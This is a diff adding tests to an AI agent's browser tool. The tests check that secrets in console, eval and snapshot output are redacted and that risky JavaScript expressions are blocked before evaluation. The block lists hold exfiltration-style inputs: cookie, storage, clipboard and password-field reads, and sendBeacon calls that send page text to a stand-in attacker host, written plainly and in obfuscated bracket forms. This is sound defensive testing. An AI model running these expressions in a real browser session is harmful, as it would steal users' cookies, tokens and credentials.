@@ -95,6 +95,156 @@ class TestBrowserConsole:
         assert result["total_messages"] == 0
         assert result["total_errors"] == 0
 
+    def test_redacts_secrets_from_console_messages_and_errors(self):
+        from tools.browser_tool import browser_console
+
+        fake_key = "sk-" + "BROWSERCONSOLESECRET1234567890"
+        console_response = {
+            "success": True,
+            "data": {"messages": [{"text": f"token={fake_key}", "type": "log"}]},
+        }
+        errors_response = {
+            "success": True,
+            "data": {"errors": [{"message": f"Uncaught auth {fake_key}"}]},
+        }
+        with patch("tools.browser_tool._run_browser_command") as mock_cmd:
+            mock_cmd.side_effect = [console_response, errors_response]
+            result = json.loads(browser_console(task_id="test"))
+
+        serialized = json.dumps(result)
+        # The secret body must be gone. The exact mask format
+        # (partial ``sk-…7890`` vs full ``***`` for keyed ``token=`` values)
+        # is owned by agent.redact and intentionally not pinned here.
+        assert "BROWSERCONSOLESECRET" not in serialized
+        redacted_text = result["console_messages"][0]["text"]
+        assert fake_key not in redacted_text
+        assert "***" in redacted_text or "..." in redacted_text
+
+    def test_redacts_secrets_from_eval_result(self):
+        from tools.browser_tool import _browser_eval
+
+        fake_key = "ghp_" + "BROWSEREVALSECRET1234567890"
+        with patch("tools.browser_tool._last_session_key", return_value="test"), \
+             patch("tools.browser_tool._is_camofox_mode", return_value=False), \
+             patch("tools.browser_tool._run_browser_command", return_value={"success": True, "data": {"result": fake_key}}):
+            result = json.loads(_browser_eval("document.body.innerText", task_id="test"))
+
+        assert result["success"] is True
+        assert "BROWSEREVALSECRET" not in json.dumps(result)
+        assert result["result"].startswith("ghp_")
+
+    def test_redacts_secrets_from_snapshot_output(self):
+        from tools.browser_tool import browser_snapshot
+
+        fake_key = "xai-" + "BROWSERSNAPSHOTSECRET12345678901234567890"
+        snapshot_response = {
+            "success": True,
+            "data": {"snapshot": f"text: key {fake_key}", "refs": {}},
+        }
+        with patch("tools.browser_tool._last_session_key", return_value="test"), \
+             patch("tools.browser_tool._is_camofox_mode", return_value=False), \
+             patch("tools.browser_tool._run_browser_command", return_value=snapshot_response):
+            result = json.loads(browser_snapshot(task_id="test"))
+
+        assert result["success"] is True
+        assert "BROWSERSNAPSHOTSECRET" not in result["snapshot"]
+        assert "xai-" in result["snapshot"]
+
+    def test_expression_allows_harmless_dom_inspection(self):
+        from tools.browser_tool import browser_console
+
+        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
+             patch("tools.browser_tool._browser_eval", return_value=json.dumps({"success": True, "result": "Example"})) as mock_eval:
+            result = json.loads(browser_console(expression="document.title", task_id="test"))
+
+        assert result == {"success": True, "result": "Example"}
+        mock_eval.assert_called_once_with("document.title", "test")
+
+    def test_expression_blocks_cookie_access_before_eval(self):
+        from tools.browser_tool import browser_console
+
+        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
+             patch("tools.browser_tool._browser_eval") as mock_eval:
+            result = json.loads(browser_console(expression="document.cookie", task_id="test"))
+
+        assert result["success"] is False
+        assert "Blocked" in result["error"]
+        assert "document.cookie" in result["error"]
+        mock_eval.assert_not_called()
+
+    def test_expression_blocks_storage_and_network_access_before_eval(self):
+        from tools.browser_tool import browser_console
+
+        risky_expressions = [
+            "localStorage.getItem('token')",
+            "sessionStorage.token",
+            "indexedDB.databases()",
+            "navigator.clipboard.readText()",
+            "fetch('/api/me')",
+            "navigator.sendBeacon('https://evil.test', document.body.innerText)",
+            "document.querySelector('input[type=password]').value",
+        ]
+        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
+             patch("tools.browser_tool._browser_eval") as mock_eval:
+            for expr in risky_expressions:
+                result = json.loads(browser_console(expression=expr, task_id="test"))
+                assert result["success"] is False, expr
+                assert "Blocked" in result["error"], expr
+
+        mock_eval.assert_not_called()
+
+    def test_expression_blocks_equivalent_bracket_sensitive_access_before_eval(self):
+        from tools.browser_tool import browser_console
+
+        risky_expressions = [
+            'document["cookie"]',
+            "document['cookie']",
+            'document[`cookie`]',
+            'document["coo" + "kie"]',
+            'document["co\\x6fkie"]',
+            'globalThis["fetch"]("/exfil")',
+            'window["XMLHttpRequest"]',
+            'navigator["sendBeacon"]("https://evil.test", document.body.innerText)',
+            'navigator["clipboard"].readText()',
+            'globalThis["localStorage"].getItem("token")',
+        ]
+        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
+             patch("tools.browser_tool._browser_eval") as mock_eval:
+            for expr in risky_expressions:
+                result = json.loads(browser_console(expression=expr, task_id="test"))
+                assert result["success"] is False, expr
+                assert "Blocked" in result["error"], expr
+
+        mock_eval.assert_not_called()
+
+    def test_expression_allows_string_literals_without_sensitive_tokens(self):
+        from tools.browser_tool import browser_console
+
+        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=False), \
+             patch("tools.browser_tool._browser_eval", return_value=json.dumps({"success": True, "result": True})) as mock_eval:
+            result = json.loads(browser_console(expression='document.title.includes("Example")', task_id="test"))
+
+        assert result == {"success": True, "result": True}
+        mock_eval.assert_called_once_with('document.title.includes("Example")', "test")
+
+    def test_expression_config_opt_in_allows_risky_eval(self):
+        from tools.browser_tool import browser_console
+
+        with patch("tools.browser_tool._allow_unsafe_browser_evaluate", return_value=True), \
+             patch("tools.browser_tool._browser_eval", return_value=json.dumps({"success": True, "result": "cookie=value"})) as mock_eval:
+            result = json.loads(browser_console(expression="document.cookie", task_id="test"))
+
+        assert result == {"success": True, "result": "cookie=value"}
+        mock_eval.assert_called_once_with("document.cookie", "test")
+
+    def test_allow_unsafe_evaluate_reads_browser_config(self):
+        from tools.browser_tool import _allow_unsafe_browser_evaluate
+
+        with patch("hermes_cli.config.read_raw_config", return_value={"browser": {"allow_unsafe_evaluate": "true"}}):
+            assert _allow_unsafe_browser_evaluate() is True
+        with patch("hermes_cli.config.read_raw_config", return_value={"browser": {"allow_unsafe_evaluate": False}}):
+            assert _allow_unsafe_browser_evaluate() is False
+
 
 # ── browser_console schema ───────────────────────────────────────────
 
